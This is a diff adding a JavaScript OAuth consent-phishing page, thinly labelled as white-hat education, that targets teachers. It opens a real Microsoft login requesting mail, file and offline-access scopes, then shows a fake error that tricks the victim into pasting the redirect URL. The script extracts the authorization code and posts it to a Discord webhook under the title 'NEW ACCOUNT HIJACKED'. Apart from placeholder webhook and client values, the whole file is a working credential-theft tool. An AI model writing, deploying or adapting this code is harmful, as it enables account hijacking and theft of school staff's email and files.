@@ -1,0 +1,67 @@
+/* 
+   WHITE-HAT EDUCATION NOTE: 
+   A real black-hat would host this on a site like "school-verify-service.com"
+*/
+
+// 1. The Real OAuth Redirect
+// This sends the teacher to a LEGITIMATE Microsoft/Google login page.
+function redirectToRealAuth() {
+    const client_id = "00000000-0000-0000-0000-000000000000"; // Fake ID for demo
+    const redirect_uri = "http://localhost/verify"; // Where the 'code' appears
+    const scope = "Mail.Read Files.ReadWrite.All offline_access"; // The "Theft" permissions
+    
+    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                    `client_id=${client_id}&response_type=code&` +
+                    `redirect_uri=${encodeURIComponent(redirect_uri)}&` +
+                    `scope=${encodeURIComponent(scope)}&response_mode=query`;
+
+    // In a real attack, this opens a popup or redirects the current tab
+    window.open(authUrl, '_blank'); 
+    
+    // Move to the "Manual Fix" trap immediately
+    document.getElementById('display-area').innerHTML = `
+        <p style="color:red">SYSTEM ERROR: Automatic Verification Failed.</p>
+        <p>Please copy the URL from the window that just opened and paste it here:</p>
+        <input type="text" id="stolenCode" style="width:80%">
+        <button onclick="exfiltrateData()">Finish Sync</button>
+    `;
+}
+
+// 2. The Exfiltration (The "Illegal" Part)
+// This takes the pasted URL (which contains the secret code) and sends it away.
+async function exfiltrateData() {
+    const fullUrl = document.getElementById('stolenCode').value;
+    
+    // A black-hat uses a Regex to grab the 'code' parameter from the URL
+    const codeMatch = fullUrl.match(/[?&]code=([^&]+)/);
+    const secretCode = codeMatch ? codeMatch[1] : null;
+
+    if (!secretCode) {
+        alert("Invalid URL. Please copy the full address bar.");
+        return;
+    }
+
+    // THE WEBHOOK: This is where the data leaves the building.
+    const webhookURL = "PASTE_WEBHOOK_HERE"; 
+
+    const payload = {
+        embeds: [{
+            title: "🔓 NEW ACCOUNT HIJACKED",
+            color: 16711680, // Red
+            description: `**Stolen Auth Code:** \`${secretCode}\`\n` +
+                         `**Source:** Teacher Workstation\n` +
+                         `**Status:** Ready for Token Exchange (offline_access granted)`,
+            footer: { text: "ConsentFix v1.2" },
+            timestamp: new Date()
+        }]
+    };
+
+    // Sending the data to the hacker's server (Discord)
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+
+    alert("Verification Complete. Thank you.");
+}
